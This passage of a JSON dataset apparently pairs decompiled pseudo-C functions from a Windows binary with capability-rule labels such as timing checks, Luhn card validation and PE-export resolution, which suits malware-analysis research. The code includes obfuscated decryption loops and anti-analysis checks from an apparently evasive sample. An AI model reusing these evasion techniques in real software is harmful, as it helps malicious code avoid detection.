        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Removing unreachable block (ram,0x00401f6d)\n\nchar __cdecl fcn.00401ee0(uint32_t arg_8h)\n\n{\n    char cStack49;\n    uint var_bp_4h;\n    \n    if (arg_8h < 0x3e) {\n        cStack49 = *(arg_8h + 0x405597) + '\\x11';\n    }\n    else {\n        cStack49 = '\\0';\n    }\n    return cStack49;\n}\n",
        "token_count": 128
    },
    "00402080": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Removing unreachable block (ram,0x004020b7)\n\nbool __cdecl fcn.00402080(int32_t arg_8h)\n\n{\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_2h;\n    \n    if (arg_8h == 0) {\n        fcn.00401000();\n    }\n    return arg_8h == 0;\n}\n",
        "token_count": 127
    },
    "00402130": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040215d)\n\nuint fcn.00402130(void)\n\n{\n    int32_t iVar1;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00402100();\n    return *(iVar1 + 0x34);\n}\n",
        "token_count": 86
    },
    "00402190": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_eh\n\nvoid __cdecl fcn.00402190(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    uint var_30h;\n    uint var_2ch;\n    uint var_26h;\n    uint var_1ch;\n    uint var_15h;\n    uint var_eh;\n    \n    arg_ch[3] = *0x4063d4 + -0x8ac91e0;\n    arg_ch[1] = *0x4063d0 + -0x296fa6;\n    *arg_ch = arg_8h + 0x529a;\n    arg_ch[2] = arg_8h + 0x408;\n    return;\n}\n",
        "token_count": 166
    },
    "00402250": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint fcn.00402250(void)\n\n{\n    uint16_t uVar1;\n    int16_t iVar2;\n    uint arg_8h;\n    int32_t iVar3;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h = fcn.004034a0();\n    iVar3 = fcn.00401810(arg_8h);\n    uVar1 = *(iVar3 + 0x48);\n    iVar3 = fcn.00401810(arg_8h);\n    iVar2 = *(iVar3 + 0x4a);\n    iVar3 = fcn.00401960();\n    if (*(iVar3 + 0xa4) < 6) {\n        var_20h = 1;\n    }\n    else if (uVar1 < 6) {\n        var_20h = 1;\n    }\n    else if ((uVar1 == 6) && (iVar2 == 0)) {\n        var_20h = 1;\n    }\n    else {\n        var_20h = 0;\n    }\n    return var_20h;\n}\n",
        "token_count": 281
    },
    "00402580": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004025ef)\n// WARNING: Removing unreachable block (ram,0x00402608)\n\nuint16_t __cdecl fcn.00402580(uint arg_8h)\n\n{\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    \n    if ((0x60 < arg_8h) && (arg_8h < 0x7b)) {\n        arg_8h._0_2_ = arg_8h - 0x20;\n    }\n    return arg_8h;\n}\n",
        "token_count": 135
    },
    "00402630": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402681)\n\nint32_t __cdecl fcn.00402630(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t in_FS_OFFSET;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_18h;\n    uint var_14h;\n    \n    if (arg_ch == 1) {\n        for (var_24h = 0; *(arg_8h + var_24h) != '\\0'; var_24h = var_24h + 1) {\n        }\n        var_30h = var_24h;\n    }\n    else {\n        if (arg_ch != 3) {\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n        var_30h = *(in_FS_OFFSET + arg_8h);\n    }\n    return var_30h;\n}\n",
        "token_count": 259
    },
    "00402940": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00402940(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    char cVar4;\n    uint32_t uVar5;\n    uint32_t auStack336 [62];\n    uint32_t uStack88;\n    int32_t iStack84;\n    uint32_t uStack80;\n    char cStack73;\n    uint uStack72;\n    uint uStack68;\n    uint32_t uStack60;\n    uint32_t uStack56;\n    uint32_t uStack52;\n    uint32_t uStack48;\n    char cStack43;\n    uint32_t uStack40;\n    uint32_t uStack36;\n    int32_t iStack24;\n    uint var_ch;\n    \n    iVar2 = iStack24;\n    uStack36 = 0;\n    uStack40 = 0x5e0b64dd;\n    cStack43 = -0x49;\n    uStack48 = 0x7b4ebd69;\n    uStack72 = 0x679b79da;\n    uStack68 = 0;\n    iStack24 = iStack24 + 0x3fe5d520;\n    fcn.004012b0(auStack336, 0x4055d8, 0xf8);\n    iVar3 = 0x7b4ebda7 - uStack48;\n    for (uStack88 = uStack48 + 0x84b14297; iStack84 = -0x6cd1cdee - uStack48,  uStack88 < 0x7b4ebda7 - uStack48;\n        uStack88 = (uStack48 ^ 0x7b4ebd68) + uStack88) {\n        uStack60 = auStack336[uStack88];\n        uStack80 = auStack336[uStack88];\n        while( true ) {\n            uStack52 = -(0x7b508b40 < uStack40) - uStack36;\n            uStack56 = 0x7b508b40 - uStack40;\n            if ((uStack52 < uStack36 || uStack52 - uStack36 < (0x7b508b40 - uStack40 < (uStack40 ^ 0x7df600f9))) &&\n               (arg_10h <= uStack80)) break;\n            cVar4 = cStack43 + 'H';\n            cVar1 = *(arg_ch + uStack80);\n            cStack73 = fcn.00401ee0(uStack80 % (uStack48 + 0x84b142d5));\n            iStack24 = iVar2 + 0x36bbd3ac;\n            *(arg_8h + uStack80) = (cVar4 + cVar1) - cStack73;\n            do {\n                uVar5 = -(0x9eaa7964 < uStack40) - uStack36;\n            } while (uVar5 < uStack36 || uVar5 - uStack36 < (0x9eaa7964 - uStack40 < (uStack40 ^ 0x516b81ec)));\n            uStack80 = uStack80 + iVar3;\n        }\n    }\n    return;\n}\n",
        "token_count": 742
    },
    "00403420": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_2h\n\nbool fcn.00403420(void)\n\n{\n    int32_t iVar1;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_2h;\n    \n    iVar1 = sub.pdh.dll_PdhValidatePathExA(0, 0, 0);\n    return iVar1 == 0;\n}\n",
        "token_count": 111
    },
    "004034a0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.004034a0(void)\n\n{\n    uint var_68h;\n    uint32_t var_28h;\n    uint var_24h;\n    uint32_t var_4h;\n    \n    var_4h = 0x6921ab20;\n    fcn.00401db0(&var_24h, 0x405558, 0xb);\n    for (var_28h = var_4h ^ 0x6921ab20; var_28h != 0x6921ab40 - var_4h; var_28h = var_28h + (0x6921ab21 - var_4h)) {\n        *(&var_68h + var_28h * 2) = *(&var_24h + var_28h);\n    }\n    fcn.00402e10(&var_68h);\n    return;\n}\n",
        "token_count": 195
    },
    "00404140": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Removing unreachable block (ram,0x004041c3)\n// WARNING: Removing unreachable block (ram,0x0040425f)\n\nuint __cdecl fcn.00404140(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uStack56;\n    uint var_4h;\n    \n    iVar1 = fcn.00402250();\n    if (iVar1 == 0) {\n        if (arg_8h == 0) {\n            iVar1 = fcn.00403420();\n            if (iVar1 == 0) {\n                uStack56 = 0;\n            }\n            else {\n                uStack56 = 1;\n            }\n        }\n        else {\n            uStack56 = 1;\n        }\n    }\n    else {\n        uStack56 = 1;\n    }\n    return uStack56;\n}\n",
        "token_count": 202
    },
    "004017d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004017d0(uint arg_8h)\n\n{\n    uint var_ch;\n    uint var_8h;\n    \n    fcn.00402630(arg_8h, 1);\n    return;\n}\n",
        "token_count": 50
    },
    "00401960": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint fcn.00401960(void)\n\n{\n    int32_t iVar1;\n    uint var_dh;\n    uint var_8h;\n    uint var_1h;\n    \n    iVar1 = fcn.00402100();\n    return *(iVar1 + 0x30);\n}\n",
        "token_count": 78
    },
    "00401db0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Removing unreachable block (ram,0x00401eab)\n\nvoid __cdecl fcn.00401db0(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uStack48;\n    uint var_bp_ch;\n    \n    for (uStack48 = 0; uStack48 < arg_10h; uStack48 = uStack48 + 1) {\n        fcn.00401510(arg_8h, arg_ch, uStack48, *(uStack48 % 0x10 + 0x4056d0));\n    }\n    return;\n}\n",
        "token_count": 150
    },
    "00402100": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00402100(void)\n\n{\n    uint var_4h;\n    \n    fcn.00401680(0x18);\n    return;\n}\n",
        "token_count": 35
    },
    "00403570": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403570(void)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    \n    iVar3 = (*_sym.imp.ole32.dll_CoReleaseServerProcess)();\n    piVar1 = (iVar3 >> 0x1f) + 0xc246aea;\n    *piVar1 = *piVar1 - (iVar3 >> 0x1f);\n    pcVar2 = swi(1);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 116
    },
    "null": {
        "rules": [
            "contain loop",
            "accept command line arguments",
            "resolve function by parsing PE exports"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid entry0(void)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    code *pcVar4;\n    uchar uVar5;\n    uint uVar6;\n    uint32_t unaff_EBX;\n    uint32_t uVar7;\n    uchar *puVar8;\n    uchar *puVar9;\n    uchar *puVar10;\n    uint *puVar11;\n    uint *puVar12;\n    uchar *puVar13;\n    uchar *puVar14;\n    uchar *puVar15;\n    int32_t *unaff_EBP;\n    int32_t iVar16;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint8_t in_stack_00000020;\n    uint var_4h;\n    \n    *0x4063a4 = unaff_EBX;\n    *0x4063a8 = unaff_EBP;\n    *0x4063ac = *0x10;\n    uVar6 = fcn.00402710();\n    iVar16 = *unaff_EBP;\n    *unaff_EBP = iVar16;\n    unaff_EBP[-1] = unaff_EBP;\n    *(iVar16 + -4) = uVar6;\n    unaff_EBP[-2] = iVar16;\n    unaff_EBP[-3] = (unaff_EBX & 0xffffff00 | in_stack_00000020) ^ 0xff;\n    unaff_EBP[-4] = unaff_EDI;\n    unaff_EBP[-5] = unaff_ESI;\n    uVar7 = unaff_EBP + -5 & 0xfffffff8;\n    *(uVar7 - 0x11) = 0x14;\n    *(uVar7 - 0x1c) = 0;\n    *(uVar7 - 0x20) = 0x361d47d5;\n    *(uVar7 - 0x24) = 0x233d774d;\n    *(uVar7 - 0x3c) = *(uVar7 - 0x24) ^ 0x233d774d;\n    puVar8 = uVar7 - 0xb0;\n    while (*(puVar8 + 0x74) != 0x233d7758 - *(puVar8 + 0x8c)) {\n        uVar2 = *(puVar8 + 0x8c);\n        cVar1 = puVar8[0x9f];\n        *(puVar8 + 0x6c) = 0xccfb46;\n        *(puVar8 + 0x68) = uVar2 + 0xdcc28bfa;\n        *(puVar8 + 0x70) = uVar2 + 0xdd9dbb03;\n        *(puVar8 + 100) = *(puVar8 + 0x90);\n        *(puVar8 + 0x60) = *(puVar8 + 0x94);\n        *(puVar8 + 0x5c) = 0;\n        *(puVar8 + 0x58) = puVar8 + 0x78;\n        *(puVar8 + 0x54) = 0x36bf17ee - *(puVar8 + 100);\n        *(puVar8 + 0x50) = puVar8;\n        *(puVar8 + 0x4c) = puVar8 + 0x70;\n        puVar3 = *(puVar8 + 0x50);\n        *(puVar8 + 0x48) = (*(puVar8 + 0x5c) - *(puVar8 + 0x60)) - (0x36bf17ee < *(puVar8 + 100));\n        puVar3[4] = *(puVar8 + 0x4c);\n        puVar3[3] = uVar2 + 0xdcc28b1a;\n        puVar3[2] = 0x23f59717 - uVar2;\n        puVar3[1] = *(puVar8 + 0x68);\n        *puVar3 = uVar2 ^ 0x2398fc41;\n        pcVar4 = _sym.imp.ADVAPI32.dll_CryptDeriveKey;\n        puVar8[0x47] = cVar1 + -0xc;\n        puVar9 = puVar8 + -4;\n        *(puVar8 + -4) = 0x402496;\n        uVar6 = (*pcVar4)();\n        *(puVar9 + 0x68) = *(puVar9 + 0x34);\n        *(puVar9 + 100) = *(puVar9 + 0x40);\n        *(puVar9 + -0x10) = puVar9 + 100;\n        *(puVar9 + -0x14) = 0xccfb46;\n        pcVar4 = _sym.imp.KERNEL32.dll_QueryProcessCycleTime;\n        *(puVar9 + 0x2c) = uVar6;\n        puVar10 = puVar9 + -0x18;\n        *(puVar9 + -0x18) = 0x4024c4;\n        uVar6 = (*pcVar4)();\n        pcVar4 = _sym.imp.KERNEL32.dll_GetCommandLineW;\n        *(puVar10 + 0x34) = uVar6;\n        puVar11 = puVar10 + -0xc;\n        *(puVar10 + -0xc) = 0x4024d3;\n        uVar6 = (*pcVar4)();\n        puVar11[1] = puVar11 + 0x21;\n        *puVar11 = 0x675663;\n        pcVar4 = _sym.imp.GDI32.dll_GetDCOrgEx;\n        puVar11[0xe] = uVar6;\n        puVar11[0xd] = 0x675663;\n        puVar11[0xc] = puVar11 + 0x21;\n        puVar12 = puVar11 + -1;\n        puVar11[-1] = 0x402505;\n        uVar6 = (*pcVar4)();\n        *(puVar12 + -8) = *(puVar12 + 0x3f);\n        pcVar4 = _sym.imp.KERNEL32.dll_Wow64EnableWow64FsRedirection;\n        *(puVar12 + 0x24) = uVar6;\n        puVar13 = puVar12 + -0xc;\n        *(puVar12 + -0xc) = 0x40251f;\n        uVar5 = (*pcVar4)();\n        *(puVar13 + -4) = L\"2X>Bu-G!EFx\";\n        pcVar4 = _sym.imp.OLEAUT32.dll_VariantInit;\n        puVar13[0x27] = uVar5;\n        *(puVar13 + 0x20) = L\"2X>Bu-G!EFx\";\n        puVar14 = puVar13 + -8;\n        *(puVar13 + -8) = 0x402540;\n        uVar6 = (*pcVar4)();\n        *(puVar14 + -4) = 0x1f1a96;\n        pcVar4 = _sym.imp.GDI32.dll_GetPolyFillMode;\n        *(puVar14 + 0x1c) = uVar6;\n        *(puVar14 + 0x18) = 0x1f1a96;\n        puVar15 = puVar14 + -8;\n        *(puVar14 + -8) = 0x402560;\n        uVar6 = (*pcVar4)();\n        *(puVar15 + -4) = 0x481211;\n        *(puVar15 + 0x14) = uVar6;\n        *(puVar15 + -8) = 0x402574;\n        uVar6 = sub.USER32.dll_DdeUnaccessData();\n        *(puVar15 + 0xc) = uVar6;\n        *(puVar15 + 0x6c) = *(puVar15 + 0x6c) + (0x233d774e - *(puVar15 + 0x84));\n        puVar8 = puVar15 + -8;\n    }\n    return;\n}\n",
        "token_count": 1830
    }
}